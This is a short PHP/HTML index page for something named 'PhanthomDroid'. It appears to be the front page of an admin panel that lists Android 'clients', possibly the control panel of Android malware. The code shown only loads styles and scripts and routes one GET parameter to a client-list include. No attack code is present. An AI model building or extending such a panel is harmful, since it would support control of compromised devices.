<html>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

<head >
<title>PhanthomDroid</title>
<link rel="shortcut icon" href="/admin/images/icons/android.ico">
<link href="styles/index.css" rel="stylesheet"/>
<link href="styles/btn.css" rel="stylesheet"/>
<link href="styles/modul_form.css" rel="stylesheet"/>
<link rel="stylesheet" href="styles/style.css"/>
<link href="styles/modul_form_log.css" rel="stylesheet"/>
<link href="styles/modul_form_set.css" rel="stylesheet"/>
<script type="text/javascript" src="js/jquery.js"></script>
<link rel="shortcut icon" href="/images/icon3.png" type="image/png"/>

<script src="js/jquery-2.1.4.min.js"></script>
<script src="js/jquery.spincrement.js"></script>
<script src="js/custom.js"></script>
<script src="js/footable.js"></script>
<script src="js/footable.min.js"></script>
</head>

 <body bgcolor="1D1F24">

<?php include_once "header.php"?>
<?php

$id = $_GET['cont'];
	if($id=="kliets")
	{include_once "private/kliets.php";
	}else
	{header("Location:?cont=kliets&page=1");}
	if($id == null)
	{header("Location:?cont=kliets&page=1");}
?>
</body>
</html>